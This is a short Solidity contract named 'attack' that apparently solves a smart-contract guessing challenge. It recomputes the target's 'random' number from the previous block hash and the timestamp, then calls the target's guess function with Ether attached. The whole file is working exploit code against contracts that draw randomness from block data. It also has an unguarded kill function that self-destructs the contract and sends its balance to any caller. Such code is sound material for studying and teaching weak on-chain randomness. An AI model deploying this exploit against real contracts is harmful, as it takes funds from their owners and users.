pragma solidity ^0.4.21;

interface IGuess{
    function guess(uint8 n) external payable;
}

contract attack{
    IGuess igu;
    constructor(address addr){
        igu = IGuess(addr);
    }
    function hack() public payable {
        uint8 t = uint8(keccak256(block.blockhash(block.number - 1), now));
        igu.guess.value(msg.value)(t);
    }
    function getbalance() view public returns(uint){
        return address(this).balance;
    }
    function kill() public{
        selfdestruct(msg.sender);
    }

    function () public payable {
    }
}

